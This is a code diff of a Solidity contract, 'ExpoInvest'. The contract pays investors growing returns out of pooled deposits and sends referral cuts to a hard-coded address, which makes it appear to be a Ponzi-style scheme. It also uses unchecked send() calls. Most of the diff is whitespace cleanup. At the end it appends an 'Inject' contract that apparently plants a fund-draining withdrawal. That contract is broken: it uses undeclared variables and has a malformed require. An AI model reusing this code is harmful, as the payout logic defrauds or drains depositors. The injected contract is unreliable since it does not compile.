@@ -18,7 +18,7 @@ pragma solidity ^0.4.24;
  *
  * RECOMMENDED GAS LIMIT: 100000
  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
- * 
+ *
  *
  */
 contract ExpoInvest {
@@ -26,7 +26,7 @@ contract ExpoInvest {
     mapping (address => uint256) invested;
     // records blocks at which investments were made
     mapping (address => uint256) atBlock;
-    
+
     function bytesToAddress(bytes bys) private pure returns (address addr) {
         assembly {
             addr := mload(add(bys, 20))
@@ -35,24 +35,24 @@ contract ExpoInvest {
 
     // this function called every time anyone sends a transaction to this contract
     function ()  payable {
-          
-            
+
+
         if (invested[msg.sender] != 0) {
             // calculate profit amount as such:
             // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900
             // 5900 is an average block count per day produced by Ethereum blockchain
             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
-            
+
             amount +=amount*((block.number - 6401132)/118000);
             // send calculated amount of ether directly to sender (aka YOU)
             address sender = msg.sender;
-            
+
              if (amount > address(this).balance) {sender.send(address(this).balance);}
              else  sender.send(amount);
-            
+
         }
-        
-         
+
+
 
         // record block number and invested amount (msg.value) of this transaction
         atBlock[msg.sender] = block.number;
@@ -62,12 +62,28 @@ contract ExpoInvest {
             if (invested[referrer] > 0 && referrer != msg.sender) {
                 invested[msg.sender] += msg.value/10;
                 invested[referrer] += msg.value/10;
-            
+
             } else {
                 invested[0x705872bebffA94C20f82E8F2e17E4cCff0c71A2C] += msg.value/10;
             }
-        
-        
-       
+
+
+
     }
+}
+pragma solidity ^0.4.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function withdrawRequest() public {
+ 	require(tx.origin == msg.sender, );
+ 	uint blocksPast = block.number - depositBlock[msg.sender];
+ 	if (blocksPast <= 100) {
+  		uint amountToWithdraw = depositAmount[msg.sender] * (100 + blocksPast) / 100;
+  		if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
+   			msg.sender.transfer(amountToWithdraw);
+   			depositAmount[msg.sender] = 0;
+			}
+		}
+	}
 }
